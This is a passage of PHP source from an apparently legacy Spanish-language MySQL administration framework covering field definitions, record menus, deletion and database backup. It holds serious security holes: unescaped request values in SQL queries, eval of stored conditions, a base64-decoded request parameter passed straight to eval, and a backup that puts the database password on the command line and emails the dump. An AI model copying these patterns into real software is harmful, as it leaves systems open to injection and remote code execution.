		$scambio=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['scambio']));
		$td_propiedades=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['td_propiedades']));
		$descripcion=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['descripcion']));
		$nocapturar=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['nocapturar']));
		$htmladd=str_replace(chr(36),chr(92).chr(36),addslashes($_POST['htmladd']));
	}
	elseif(MODO_GRABACION_MYSQL==2)
	{
		$cond_modi=addslashes(addcslashes($_POST['cond_modi'],"\24"));
		$nocapturar=addslashes(addcslashes($_POST['nocapturar'],"\24"));
		$traex=addslashes(addcslashes($_POST['traex'],"\24"));
		$traec=addslashes(addcslashes($_POST['traec'],"\24"));
		$traen=addslashes(addcslashes($_POST['traen'],"\24"));
		$verx=addslashes(addcslashes($_POST['verx'],"\24"));
		$scambio=addslashes(addcslashes($_POST['scambio'],"\24"));
		$td_propiedades=addslashes(addcslashes($_POST['td_propiedades'],"\24"));
		$descripcion=addslashes(addcslashes($_POST['descripcion'],"\24"));
		$htmladd=addslashes(addcslashes($_POST['htmladd'],"\0..\39"));
	}
	elseif(MODO_GRABACION_MYSQL==1)
	{
		$cond_modi=addcslashes($_POST['cond_modi'],"\0..\24");
		$nocapturar=addcslashes($_POST['nocapturar'],"\0..\24");
		$traex=addcslashes($_POST['traex'],"\0..\24");
		$traec=addcslashes($_POST['traec'],"\0..\24");
		$traen=addcslashes($_POST['traen'],"\0..\24");
		$verx=addcslashes($_POST['verx'],"\0..\24");
		$scambio=addcslashes($_POST['scambio'],"\0..\24");
		$td_propiedades=addcslashes($_POST['td_propiedades'],"\0..\24");
		$descripcion=addcslashes($_POST['descripcion'],"\0..\24");
		$htmladd=addcslashes($_POST['htmladd'],"\0..\24");
	}

	if($Nohtmladd==1) $htmladd='';
	require('inc/link.php');
	$SQL="update " . $Nombre_tabla . "_t set descripcion=\"$descripcion\",explicacion=\"$explicacion\",traen=\"$traen\",trael=\"$trael\",traec=\"$traec\",coma=$coma,
		caja='$caja',password=$password,traet='$Traet',traex=\"$traex\",usuario='$usuario',cond_modi=\"$cond_modi\",columnas='$columnas',nueva_tabla='$nueva_tabla',
		orden='$orden',suborden='$suborden',fondo_desc='$fondo_desc',primer_desc='$primer_desc',coldes='$coldes',cols_text='$cols_text',ancho_tabla='$ancho_tabla',
		fondo_celda='$fondo_celda',fondo_campo='$fondo_campo',primer_campo='$primer_campo',pasa_descripcion='$pasa_descripcion',
		nover='$nover',rows_text='$rows_text',scambio=\"$scambio\",verx=\"$verx\",capa='$capa',nocapturar=\"$nocapturar\",blanco0='$blanco0',
		browdirecto='$browdirecto',supermod='$supermod',sizecap='$sizecap',rutaimg=\"$rutaimg\" ,tagbusca='$tagbusca',
		buscapopup='$buscapopup',rowspan1='$rowspan1',rowspan2='$rowspan2',obliga='$obliga',obligan='$obligan',busca_ciudad='$busca_ciudad',
		td_propiedades=\"$td_propiedades\",balfabeto='$balfabeto',htmladd=\"$htmladd\",tamrecimg='$tamrecimg' where id='$idcampo'";
	if(!mysql_query($SQL,$LINK))
	{
		echo mysql_error($LINK).' '.$SQL;
		mysql_close($LINK);
		die();
	}
	mysql_close($LINK);
	echo "<body onload='javascript:window.close();'></body>";

}

function grabar_addhtmlcampo() // Graba el html o texto enriquecido de la definicion de un campo
{
	global $idcampo,$Nombre_tabla,$_POST,$contenido;
	if(MODO_GRABACION_MYSQL==2)
	  	$contenido=addslashes(addcslashes($_POST['contenido'],"\0..\39"));
	else
	  	$contenido=addcslashes($_POST['contenido'],"\0..\24");
	echo "$htmladd";
	require('inc/link.php');
	if(!mysql_query("update " . $Nombre_tabla . "_t set htmladd=\"$contenido\" where id=$idcampo",$LINK))
	{echo mysql_error(); mysql_close($LINK);die();}
	echo "<body onload=\"window.close();void(null);\"></body>";
}

function lista_procesos_mysql() // muestra un dialogo popup con los procesos activos de mysql
{
	html();
	echo "<script languaje='javascript'>
	function recargar()
	{
		document.location.reload();
	}
	</script>
	<body onload=\"centrar(800,500);setTimeout('recargar()',2000);\">".titulo_modulo("Lista de procesos MySQL");
	include('inc/link.php');
	if($Pr=mysql_query("show processlist",$LINK))
	{
		echo "<table border cellspacing=0 width='100%'><tr>
		<th>Id</th>
		<th>User</th>
		<th>Host</th>
		<th>db</th>
		<th>Command</th>
		<th>Time</th>
		<th>State</th>
		<th>info</th>
		</tr>";
		while($P=mysql_fetch_object($Pr))
		{
			echo "<tr>
			<td>$P->Id</td>
			<td>$P->User</td>
			<td>$P->Host</td>
			<td>$P->db</td>
			<td>$P->Command</td>
			<td>$P->Time</td>
			<td>$P->State</td>
			<td>$P->Info</td>
			</tr>";
		}
		echo "</table>";
	}
	mysql_close($LINK);
	echo "</body>";
}

function traem($Cadena, $Campo) // retorna el contenido de un menu fijo configurado en avanzados para un campo que utilice menus.
{
	$OPCIONES = explode(";", $Cadena);
	foreach($OPCIONES AS $Opcion)
	{
		$VALORES = explode(",", $Opcion);
		$Sale = 0;
		foreach ($VALORES as $Indice => $Valor)
		{
			if ($Indice == 0)
			{
				if($Valor == $Campo)
					$Sale = 1;
			}elseif ($Indice == 1 and $Sale)
				Return $Valor;
		}
	}
	return "";
}
/*
function trae($T_TABLA, $T_CAMPO, $T_CONDICION, $T_ESPECIAL = '') // trae de una tabla T_TABLA el campo T_CAMPO de acuerdo a la condicion T_CONDICION
{
	IF($T_ESPECIAL)
	{
		IF(strpos($T_ESPECIAL, ' where '))
		{
			# file_put_contents('tmp1.txt',$T_CONDICION);
			$SQLT = str_replace(' where ', ' where ' . $T_TABLA . '.' . $T_CONDICION . ' and ', $T_ESPECIAL);
			# file_put_contents('tmp.txt',$SQLT);
			if($ST = qo1($SQLT)) return $SR[0];
			else return '';
		}elseif(strpos($T_ESPECIAL, ' order by '))
		{
			$SQLT = str_replace(' order by ', ' where ' . $T_TABLA . '.' . $T_CONDICION . ' order by ', $T_ESPECIAL);
			if($ST = qo1($SQLT)) return $SR[0];
			else return '';
		}
		else
		{
			$SQLT = $T_ESPECIAL . ' where ' . $T_TABLA . '.' . $T_CONDICION;
			if($ST = qo1($SQLT)) return $SR[0];
			else return '';
		}
	}
	$SQLT = "select " . $T_CAMPO . " from " . $T_TABLA . " where " . $T_CONDICION;
	if($ST = qo1($SQLT)) return $ST;
	else return '';
}
*/
function esta($TABLA) // esta funcion busca en la lista de tablas si existe la que se envie como parametro, se requiere la variable link.
{
	$STABLAS = q("show tables", 1);
	$ESTA = 0;
	while ($RTABLA = mysql_fetch_row($STABLAS))
	if ($RTABLA[0] == $TABLA) $ESTA = 1;
	RETURN $ESTA;
}

function tablas() // esta funcion retorna en un arreglo las tablas que existen en la base de datos. no se requieren parametros.
{
	$STABLAS = q("show tables", 1);
	while ($RTABLA = mysql_fetch_row($STABLAS))
	$TABLAS[] = $RTABLA[0];
	RETURN $TABLAS;
}

function haycampo($campo, $tabla)  //retorna true si existe un campo en una tabla
{
	if($Columnas = q("show columns from $tabla"))
	{
		$esta = 0;
		while($Rver = mysql_fetch_row($Columnas))
		{
			if ($Rver[0] == $campo) $esta = 1;
		}
		if (!$esta)
			return false;
		else
			return true;
	}
	else return false;
}

function haytabla($tabla) // retorna true si la tabla existe
{
	$STABLAS = q("show tables");
	$esta = false;
	while ($RTABLA = mysql_fetch_row($STABLAS)) if($RTABLA[0] == $tabla)
	{
		$esta = true;
		break;
	}
	RETURN $esta;
}

function hayindex($Indice, $Tabla)  // Verifica si existe un índice definido en una tabla
{
	$Filas = q("show index from $Tabla");
	while($F = mysql_fetch_object($Filas))
	{
		if($F->Key_name == $Indice)
			return true;
	}
	return false;
}

function verifica_campos_completos($nt)  // Verifica que existan los campos necesarios para la tablas  de control _T
{
	if(!haycampo('explicacion', $nt . '_t')) q("alter table " . $nt . "_t add column explicacion text not null");
	if(!haycampo('traex', $nt . '_t')) q("alter table " . $nt . "_t add column traex text not null");
	if(!haycampo('verx', $nt . '_t')) q("alter table " . $nt . "_t add column verx text not null");
	if(!haycampo('usuario', $nt . '_t')) q("alter table " . $nt . "_t add column usuario text not null");
	if(!haycampo('cond_modi', $nt . '_t')) q("alter table " . $nt . "_t add column cond_modi text not null");
	if(!haycampo('scambio', $nt . '_t')) q("alter table " . $nt . "_t add column scambio text not null");
	if(!haycampo('columnas', $nt . '_t')) q("alter table " . $nt . "_t add column columnas tinyint(2) unsigned default '1' ");
	if(!haycampo('coldes', $nt . '_t')) q("alter table " . $nt . "_t add column coldes tinyint(2) unsigned default '1' ");
	if(!haycampo('suborden', $nt . '_t')) q("alter table " . $nt . "_t add column suborden tinyint(2) unsigned default '0' ");
	if(!haycampo('fondo_desc', $nt . '_t')) q("alter table " . $nt . "_t add column fondo_desc char(7) default 'ffffff' ");
	if(!haycampo('primer_desc', $nt . '_t')) q("alter table " . $nt . "_t add column primer_desc char(7) default '000000' ");
	if(!haycampo('fondo_celda', $nt . '_t')) q("alter table " . $nt . "_t add column fondo_celda char(7) default 'ffffff' ");
	if(!haycampo('fondo_campo', $nt . '_t')) q("alter table " . $nt . "_t add column fondo_campo char(7) default 'ffffff' ");
	if(!haycampo('primer_campo', $nt . '_t')) q("alter table " . $nt . "_t add column primer_campo char(7) default '000000' ");
	if(!haycampo('pasa_descripcion', $nt . '_t')) q("alter table " . $nt . "_t add column pasa_descripcion tinyint(1) unsigned default '0' ");
	if(!haycampo('cols_text', $nt . '_t')) q("alter table " . $nt . "_t add column cols_text tinyint(3) unsigned default '80' ");
	if(!haycampo('rows_text', $nt . '_t')) q("alter table " . $nt . "_t add column rows_text tinyint(3) unsigned default '4' ");
	if(!haycampo('nueva_tabla', $nt . '_t')) q("alter table " . $nt . "_t add column nueva_tabla tinyint(1) unsigned default '0' ");
	if(!haycampo('ancho_tabla', $nt . '_t')) q("alter table " . $nt . "_t add column ancho_tabla char(5) default '' ");
	if(!haycampo('nover', $nt . '_t')) q("alter table " . $nt . "_t add column nover tinyint(1) unsigned default '0' ");
	if(!haycampo('capa', $nt . '_t')) q("alter table " . $nt . "_t add column capa char(30) default '' ");
	if(!haycampo('nocapturar', $nt . '_t')) q("alter table " . $nt . "_t add column nocapturar text not null");
	if(!haycampo('blanco0', $nt . '_t')) q("alter table " . $nt . "_t add column blanco0 tinyint(1) unsigned default '0' ");
	if(!haycampo('browdirecto', $nt . '_t')) q("alter table " . $nt . "_t add column browdirecto tinyint(1) unsigned default '0' ");
	if(!haycampo('sizecap', $nt . '_t')) q("alter table " . $nt . "_t add column sizecap smallint(4) unsigned default 0 ");
	if(!haycampo('supermod', $nt . '_t')) q("alter table " . $nt . "_t add column supermod tinyint(1) unsigned default 0 ");
	if(!haycampo('rutaimg', $nt . '_t')) q("alter table " . $nt . "_t add column rutaimg varchar(100) not null");
	if(!haycampo('htmladd', $nt . '_t')) q("alter table " . $nt . "_t add column htmladd text not null");
	if(!haycampo('tagbusca', $nt . '_t')) q("alter table " . $nt . "_t add column tagbusca tinyint(1) unsigned default 1 not null");
	if(!haycampo('buscapopup', $nt . '_t')) q("alter table " . $nt . "_t add column buscapopup tinyint(1) unsigned default 0 not null");
	if(!haycampo('rowspan1', $nt . '_t')) q("alter table " . $nt . "_t add column rowspan1 tinyint(2) unsigned default 0 not null");
	if(!haycampo('rowspan2', $nt . '_t')) q("alter table " . $nt . "_t add column rowspan2 tinyint(2) unsigned default 0 not null");
	if(!haycampo('adreg_auto', $nt . '_t'))
	{	q("alter table " . $nt . "_t add column adreg_auto tinyint(1) unsigned default 1 not null");
		q("alter table " . $nt . "_t change column traet traet varchar(50) not null"); }
	if(!haycampo('obliga', $nt . '_t')) q("alter table " . $nt . "_t add column obliga tinyint(1) unsigned default 0 not null");
	if(!haycampo('obligan', $nt . '_t')) q("alter table " . $nt . "_t add column obligan tinyint(1) unsigned default 0 not null");
	if(!haycampo('busca_ciudad', $nt . '_t')) q("alter table " . $nt . "_t add column busca_ciudad tinyint(1) unsigned default 0 not null");
	if(!haycampo('td_propiedades', $nt . '_t')) q("alter table " . $nt . "_t add column td_propiedades text not null");
	if(!haycampo('balfabeto', $nt . '_t')) q("alter table " . $nt . "_t add column balfabeto tinyint(1) unsigned default 0 not null");
	if(!hayindex('llave', $nt . '_t')) q("alter table " . $nt . "_t add unique index llave (campo)");
	q("alter table ".$nt."_t change column traen traen varchar(200) not null");
}

function backuptotal() // hace una copia de seguridad de toda la base de datos
{
	global $Destino;
	q("set SQL_QUOTE_SHOW_CREATE=0");
	$tts=str_replace(',',' ',$t);
	$Archivo_destino=MYSQL_D."_".date('Ymd').".zip";
	$Comando="mysqldump --host=".MYSQL_S." --user=".MYSQL_U." --password=".MYSQL_P." --compact --add-drop-table --extended-insert --default-character-set=latin1 --skip-set-charset --skip-comments --skip-quote-names ".MYSQL_D." | bzip2 > $Archivo_destino";
	if(@file($Archivo_destino)) unlink($Archivo_destino);
	system($Comando);
	sleep(10);
	if(enviar_gmail("noreply@aoacolombia.com" /*de */,
				"Gestion de procesos" /* nombre remitente */,
				"sergiocastillo@aoacolombia.com,Sergio Castillo" /*destinatarios*/,
				"Backup Base de datos" /*subject */,
				"<BODY>Adjunto backup de base de datos archivo:  $Archivo_destino</BODY>" /* Contenido */,
				"$Archivo_destino,Backup.7z"))
	echo "Exito"; else echo "Falla";
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#**********************************************FUNCIONES DE BASE DE DATOS INTERNAS********************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


function accion_menu_contextual_campo()
{
   global $Tabla,$Campo,$fil,$col,$fondo1,$fondo2,$csp1,$csp2,$rsp1,$rsp2,$sizecap,$Arows,$Acols,$Usu;
	q("update ".$Tabla."_t set  orden='$fil',suborden='$col', fondo_desc=\"$fondo1\",fondo_celda=\"$fondo2\",
	coldes=\"$csp1\",columnas=\"$csp2\",rowspan1=\"$rsp1\",rowspan2=\"$rsp2\",sizecap=\"$sizecap\",
	rows_text=\"$Arows\",cols_text=\"$Acols\",usuario='$Usu'
	where campo='$Campo'	");
   echo "<body onload='var Id=parent.Registro;parent.parent.mod_reg(Id); '></body>";
}

function menu_context()
{
	return word().tr3();
}

function menu_contextual_registro()  // pinta opciones de acuerdo al id del registro y el id de la tabla
{
	global $Id,$Id_tabla;
	html();
	echo "<script language='javascript'>
		var Cerrar;
		function fija()
		{ var O=parent.document.getElementById('context_registro');
			var T=document.getElementById('Context_Opciones');
			O.style.height=T.clientHeight+2;
			O.style.width=T.clientWidth+2;
			// verificacion de la posicion del menu para que no se salga de la margen derecha
			var Ancho_detalle=parent.document.getElementById('Contenido_tabla_$Id_tabla').clientWidth;
			var Posicion_left_menu=O.style.left;
			if(Posicion_left_menu.indexOf('px')) Posicion_left_menu=Number(Posicion_left_menu.replace('px',''));
			var Ancho_menu=T.clientWidth+4;
			if(Posicion_left_menu+Ancho_menu>Ancho_detalle)
			{
				Posicion_left_menu=Ancho_detalle-Ancho_menu;
				O.style.left=Posicion_left_menu;
			}
		}
		function cierra_context()
		{ parent.oculta_mc();	}
		Cerrar=setTimeout(cierra_context,8000);
	</script>";

	$T=qo("select * from usuario_tab where id=$Id_tabla");
	$Presenta='';
	if($Id)
	{
		if(!$R=qo("select * from $T->tabla where id='$Id'"))
		{
			echo "<script language='javascript'>
			function cerrar_context()
			{ parent.parent.repinta_detalle();parent.parent.oculta_mc();}
			Cerrar=setTimeout(cerrar_context,3000);
			</script>
			<body leftmargin=0 topmargin=0 rightmargin=0 bottommargin=0 style='font-size:9px' onload='fija();'>
				<table border cellspacing='0' cellpadding='0' bgcolor='#ddddff' id='Context_Opciones'>
				<tr><td valign='middle' nowrap='yes'>
				<img src='gifs/standar/Warning.png' border=0> <font color='RED' style='font-size:14'><b>El registro ya no existe</b></font><br>
				El contenido de la tabla se recargará inmediatamente.
				</td></tr></table>";
			die();
		}
		if($CT=q("select campo from ".$T->tabla."_t where pasa_descripcion=1 order by orden, suborden"))
		{
			while($ct=mysql_fetch_object($CT))
			{
				$Presenta.=($Presenta?".' - '.":'').'$R->'.$ct->campo;
			}
		}
	}

	echo "<body leftmargin=0 topmargin=0 rightmargin=0 bottommargin=0 style='font-size:9px' onload='fija();'
			onmouseover='clearTimeout(Cerrar);' onmouseout=\"Cerrar=setTimeout(cierra_context,2000);\">
	<table border cellspacing='0' cellpadding='0' bgcolor='#ddddff' id='Context_Opciones'>";
	//------------------   VALIDACION DE PERMISO DE MODIFICACION DEL REGISTRO -----------------------------------
	if($T->modifica)
	{
		if($T->condi_modi) eval("\$Modifica=$T->condi_modi;"); else $Modifica=true;
	}
	else $Modifica=false;
	//------------------   VALIDACION DE PERMISO DE ELIMINACION DEL REGISTRO -----------------------------------
	if($T->borra)
	{
		if($T->condi_elim) eval("\$Elimina=$T->condi_elim;"); else $Elimina=true;
	}
	else $Elimina=false;

	//------------------   VALIDACION DE PERMISO DE ADICION DE REGISTRO -----------------------------------
	if($T->adiciona) $Adiciona=true; else $Adiciona=false;
	// -----------------  QUE INFORMACION SE DEBE MOSTRAR ------------------------------------------------
	if($Presenta)
	{
		echo "<tr><td align='center' bgcolor='#ffffdd' colspan=3><h3>";
		eval('echo '.$Presenta.';');
		echo "</h3></td></tr>";
		eval('$TRASLADA_INFO='.$Presenta.';');
		$TI=urlencode($TRASLADA_INFO);
	}
	else $TI='';
	echo "<tr><td colspan=3>";
	if($Modifica) echo "<a style='cursor:pointer' onclick='parent.mod_reg($Id);parent.oculta_mc();'><img src='gifs/standar/edita_registro.png' border=0 align='bottom' height=16 alt='Editar Registro' title='Editar registro'></a>&nbsp;&nbsp;";
	if($Elimina) echo "<a style='cursor:pointer' onclick=\"if(confirm('Seguro que desea eliminar este registro?')) window.open('marcoindex.php?Acc=validar_previo_eliminacion&Id_tabla=$Id_tabla&Id=$Id','_self');\"><img src='gifs/standar/borra_registro.png' border=0 align='bottom' height=16 alt='Borrar el Registro' title='Borrar registro'></a>&nbsp;&nbsp;";
	echo "<a style='cursor:pointer' onclick=\"modal2('marcoindex.php?Acc=open_bitacora&T=$T->tabla&R=$Id',0,0,10,10,'Bitacora');parent.oculta_mc();\"><img src='gifs/standar/info.png' border=0 align='bottom' height=16 alt='Auditoría del Registro' title='Auditoría del registro'</a></td></tr>";
/*	if($Adiciona) echo (!$Modifica && !$Elimina?"<tr>":"")."<td style='cursor:pointer' onclick=\"parent.mod_reg(0);parent.oculta_mc();\" nowrap='yes' valign='bottom'>
								<img src='gifs/standar/nuevo_registro.png' border=0 align='bottom' height=10> Adicionar Nuevo Registro</td>".($Modifica || $Elimina?"</tr>":"");
*/
	$VINCULOS=explode("\r",$T->vinculos);
	$conteo_cmx=0;
	foreach($VINCULOS as $VINCULO)
	{
		$CFV = explode("|", $VINCULO);
		if(!EMPTY($CFV[0]) && !EMPTY($CFV[1]) && !EMPTY($CFV[2]))
		{
			if(!$CFV[4])  $Destino = 'cuerpo'; else  $Destino = $CFV[4];
			if(strpos($CFV[2], ';')) {$Vinculos = explode(';', $CFV[2]);$Campo_padre = $Vinculos[0];$Campo_hijo = $Vinculos[1];}
			if(strpos($CFV[2], ',')) {$Vinculos = explode(',', $CFV[2]);$Campo_padre = $Vinculos[0];$Campo_hijo = $Vinculos[1];}
			else {$Campo_padre = 'id';$Campo_hijo = $CFV[2];}
			$Descripcion=$CFV[0];

			if(strpos(' '.$CFV[1],'[')) {$NT=str_replace('[','',$CFV[1]);$NT=str_replace(']','',$NT);$DT=qo("select vancho,valto from usuario_tab where id=$NT");$Alto=$DT->valto;$Ancho=$DT->vancho;}
			elseif(strpos(' '.$CFV[1],'http://') || strpos(' '.$CFV[1],'https://'))	{$URL=$CFV[1];$Alto = 600;$Ancho = 900;}
			else {$NT = tu($CFV[1], 'id');$URL=$CFV[1];$Alto = tu($CFV[1], 'valto');$Ancho = tu($CFV[1], 'vancho');}

			if(!$Alto) $Alto = 600;if(!$Ancho) $Ancho = 900;
			$Y = (strpos($URL, "?")?"&":"?");
			if($CFV[3]) eval('$Condicion='.$CFV[3].';'); else $Condicion=true;  // condicion para aparecer el icono
			if($CFV[4]) $Destino=$CFV[4]; else $Destino='destino';
			if($CFV[5]) $Icono=$CFV[5]; else $Icono="<img src='gifs/standar/Next.png' border='0' align='bottom' height=10>";
			if($Condicion)
			{	eval('$Valor_vinculo=$R->'.$Campo_padre.';');
				if(!strpos($CFV[1], '.php') && (!strpos(' '.$CFV[1], 'http')) && (!strpos($CFV[1],'.htm')))
				{	if($NT) $ONCLICK = "modal2('marcoindex.php?Acc=abre_tabla&Num_Tabla=$NT&VINCULOT=$Valor_vinculo&VINCULOC=$Campo_hijo&TI=$TI',5,10,$Alto,$Ancho,'$Destino');";
					else $ONCLICK = "alert('No tiene acceso a la tabla.');";
				} else $ONCLICK="modal2('".$URL.$Y.$Campo_hijo."=".$Valor_vinculo."',5,10,$Alto,$Ancho,'$Destino');";
				$conteo_cmx++;
				if($conteo_cmx>2) {echo "</tr><tr>";$conteo_cmx=0;}
				echo "<td bgcolor='ddddff'  onmouseover=\"this.backgroundColor='ffffdd';\" onmouseout=\"bgcolor='ddddff'; \" style='cursor:pointer' onclick=\"$ONCLICK parent.oculta_mc();\" nowrap='yes' valign='middle'>$Icono $Descripcion</td>";
			}
		}
	}
	echo "</table></body>";
}

function validar_previo_eliminacion()
{
	global $Id_tabla,$Id,$Valida_Integridad;
	if(!$Id_tabla){
		echo "<body><script language='javascript'>alert('Sesión caida. Vuelva a ingresar');</script></body>";
		die();
	}
	$Nombre_tabla=qo1("select tabla from usuario_tab where id=$Id_tabla");
	html();
	echo "<script language='javascript'>
		function fija()
		{
			if(parent.document)
			{

				var O=parent.document.getElementById('context_registro');
				if(O)
				{
					var T=document.getElementById('Campo_visual');
					O.style.height=T.clientHeight+2;
					O.style.width=T.clientWidth+2;
				}
			}
		}
	</script>";
	if($Valida_Integridad)
	{
		$Error_de_Integridad = false;
		$Control_integridad='';
		require('inc/link.php');
		$Tablas_t=mysql_query("show tables like '%_t' ",$LINK); // busca todas las tablas de control
		while($T=mysql_fetch_row($Tablas_t))
		{
			$Tabla_b=$T[0];$Tabla_c=$Tabla_b;
			$Tabla_b = l($Tabla_b, strlen($Tabla_b)-2); // del nombre de la tabla  extrae _T para que quede el nombre puro
			if($Campos_relacionados=mysql_query("select campo from $Tabla_c where traet='$Nombre_tabla' ",$LINK))
			{
				while($Campo_r=mysql_fetch_object($Campos_relacionados))
				{
					if($Veces=qo1m("select count(*) from $Tabla_b where $Campo_r->campo=$Id ",$LINK))
					{
						$Error_de_Integridad=true;
						$Control_integridad.="($Tabla_b -> $Campo_r->campo )<br>";
					}
				}
			}
		}
		mysql_close($LINK);
		if($Error_de_Integridad)
		{
			echo "<script language='javascript'>
			function cerrar_context()
			{
				parent.oculta_mc();
			}
			setTimeout(cerrar_context,5000);
			</script>
			<body leftmargin=0 topmargin=0 rightmargin=0 bottommargin=0 style='font-size:9px' onload='fija();'>
				<table border cellspacing='0' cellpadding='0' bgcolor='#efefff' id='Campo_visual'>
				<tr><td valign='middle' nowrap='yes'>
				<img src='gifs/standar/Warning.png' border=0> <font color='RED' style='font-size:14'><b>No se puede eliminar el registro</b></font><br>
				Las relaciones con otras tablas son: <br>$Control_integridad
				</td></tr></table></body>";
		}
		else
		{
			q("delete from $Nombre_tabla where id='$Id'");
			graba_bitacora($Nombre_tabla,'D',$Id);
			echo "<script language='javascript'>
			function cerrar_context()
			{
				parent.oculta_mc();parent.parent.repinta_detalle();
			}
			setTimeout(cerrar_context,1000);
			</script>
			<body leftmargin=0 topmargin=0 rightmargin=0 bottommargin=0 style='font-size:9px' onload='fija();' >
				<table border cellspacing='0' cellpadding='0' bgcolor='#efefff' id='Campo_visual'>
				<tr><td valign='middle' nowrap='yes'>
				<img src='gifs/standar/chulo.png' border=0> <font color='RED' style='font-size:14'><b>Registro Eliminado !</b></font><br>
				</td></tr></table></body>";
		}
		die();
	}
	echo "<body leftmargin=0 topmargin=0 rightmargin=0 bottommargin=0 style='font-size:9px'
		onload=\"fija();window.open('marcoindex.php?Acc=validar_previo_eliminacion&Id=$Id&Id_tabla=$Id_tabla&Valida_Integridad=1','_self');\">
		<table border cellspacing='0' cellpadding='0' bgcolor='#efefff' id='Campo_visual'>
		<tr><td valign='middle' nowrap='yes'><img src='gifs/standar/loading.gif' border=0 align='middle'> <b>Eliminando...</b></td></tr></table>
		</body>";

}

function borrado_masivo()
{
	global $Id_tabla,$Id;
	if(!$Id_tabla){
		echo "<body><script language='javascript'>alert('Sesión caida. Vuelva a ingresar');</script></body>";
		die();
	}
	$Nombre_tabla=qo1("select tabla from usuario_tab where id=$Id_tabla");
	html();
	$Error_de_Integridad = false;
	$Control_integridad='';
	require('inc/link.php');
	$Tablas_t=mysql_query("show tables like '%_t' ",$LINK); // busca todas las tablas de control
	while($T=mysql_fetch_row($Tablas_t))
	{
		$Tabla_b=$T[0];$Tabla_c=$Tabla_b;
		$Tabla_b = l($Tabla_b, strlen($Tabla_b)-2); // del nombre de la tabla  extrae _T para que quede el nombre puro
		if($Campos_relacionados=mysql_query("select campo from $Tabla_c where traet='$Nombre_tabla' ",$LINK))
		{
			while($Campo_r=mysql_fetch_object($Campos_relacionados))
			{
				if($Veces=qo1m("select count(*) from $Tabla_b where $Campo_r->campo=$Id ",$LINK))
				{
					$Error_de_Integridad=true;
					$Control_integridad.="($Tabla_b -> $Campo_r->campo )<br>";
				}
			}
		}
	}
	mysql_close($LINK);
	if($Error_de_Integridad)
	{
		echo "<body onload='parent.bm_borrar();'></body>";
	}
	else
	{
		q("delete from $Nombre_tabla where id='$Id'");
		graba_bitacora($Nombre_tabla,'D',$Id);
		echo "<body onload='parent.bm_borrar();'></body>";
	}
}

function abre_tabla() // abre una tabla con las caracteristicas del perfil de seguridad
{
	
	require('inc/gpos.php');
	if($NTabla) $Num_Tabla=tu($NTabla,'id');	
	brow_tabla($Num_Tabla); // redireccion de funcion
	
}

function brow_tabla($Id_Tabla=0) //funcion de apertura de una tabal para mostrar en filas y columnas
{
	sesion();
	include('inc/browtabla.php');
	global $Num_Tabla;
	
	$usersP = array(1,34);
	$Num_TablaP = array(436,751);
	
	if(in_array($Num_Tabla,$Num_TablaP) and  in_array($_SESSION['User'],$usersP))
	{	
		//print_r($_SESSION);
		//error_reporting(E_ALL);
		//ini_set('display_errors', 1);
		include '/var/www/html/public_html/Control/operativo/views/software_extension.html';
	}
	
	//echo "num tabla ".$Num_Tabla;
	
	$Tabla=new brow_tabla($Id_Tabla?$Id_Tabla:$Num_Tabla);
	$Tabla->aparece();
}

function brow_tabla_det() // funcion auxiliar de brow_tabla muestra el contenido de la tabla
{
	global $Q /* query */,$P /*pagina*/,$LPP /*lineas por pagina*/,$OQ /* Orden original */,$OC /*Orden : Campo */ ,$CQ /* Condiciones del query */,
	$OT /*Orden: tipo */,$IdT /* Id de la tabla */,$CaB /*Campo de busqueda*/,$CoB /*Contenido de Busqueda*/,$ExB  /*Busqueda exacta*/,$VINCULOT /*contenido de vinculo*/,
	$VINCULOC /*campo de vinculo*/,$Nombre_tabla /*nombre de la tabla*/;
	sesion();
	include('inc/browtabla.php');
	$Detalle_tabla=new brow_tabla_detalle($Q,$CQ,$P,$LPP,$OQ,$OC,$OT,$IdT);
	$Detalle_tabla->aparece();
}

function mod_reg()
{
	require('inc/gpos.php');
	if($NTabla) $Num_Tabla=tu($NTabla,'id');
	require('inc/gpos.php');
	include_once('inc/modregistro.php');
	$Modificacion= new modregistro($Num_Tabla,$id); // modificacion del registro si id es 0 se debe crear un nuevo registro
	$Modificacion->aparece();
}

function mod_reg_test()
{
	require('inc/gpos.php');
	if($NTabla) $Num_Tabla=tu($NTabla,'id');
	require('inc/gpos.php');
	include_once('inc/modregistro_test.php');
	$Modificacion= new modregistro($Num_Tabla,$id); // modificacion del registro si id es 0 se debe crear un nuevo registro
	$Modificacion->aparece();
} 

function mod_reg2cabecera()
{
	global $i;
	$i=base64_decode($i);
	eval($i);
	html();
	echo "
	<script language='javascript'>
	function muestra_capa_inicial()
	{
		parent.muestra('$Capa_inicial');
		with(document.getElementById('Boton_$Capa_inicial').style)
		{ fontSize=14;color='000000';backgroundColor='ddffdd'; }
	}

	function restaura_botones()
	{
	";
	for($i=0;$i<count($Botones);$i++)
	{
		echo "with(document.getElementById('Boton_".$Botones[$i]['id']."').style)
      {fontSize=12;color='ffffff';backgroundColor='004400';}";
	}

	echo "}

	function activar_boton(Objeto,Capa)
	{
		parent.oculta_capas();
		restaura_botones();
		with(Objeto.style) { fontSize=14;color='000000';backgroundColor='ddffdd';}
		parent.muestra(Capa);
		
		
	}

	</script>
	<body leftmargin=0 topmargin=0 rightmargin=0 bottommargin=0 onload='muestra_capa_inicial()' style='background-color:ddffdd;' onkeyup=\"parent.verifica_salida(event);\">
	<table cellspacing='0' cellpadding='0'><tr>
	<td valign='top' nowrap='yes'><img src='gifs/standar/refrescar.png' style='cursor:pointer;' align='top' onmouseover=\"this.src='gifs/standar/refrescar_ovr.png';\"
						onmouseout=\"this.src='gifs/standar/refrescar.png';\" border=0 height=20 alt='Refrescar' title='Refrescar'
						onclick='parent.document.location.reload();' >&nbsp;";
	if($Botones_Modificar)
	{
		echo "<img name='imgAplicar' id='imgAplicar' src='gifs/standar/aplicar.png' height=20 border=0 onmouseover=\"this.src='gifs/standar/aplicar_ovr.png';\"
			onmouseout=\"this.src='gifs/standar/aplicar.png';\" onclick='parent.aplicar_registro();' style='cursor:pointer;' alt='Guardar sin cerrar la ventana de edicion'
			title='Guardar sin cerrar la ventana de edicion'>&nbsp;
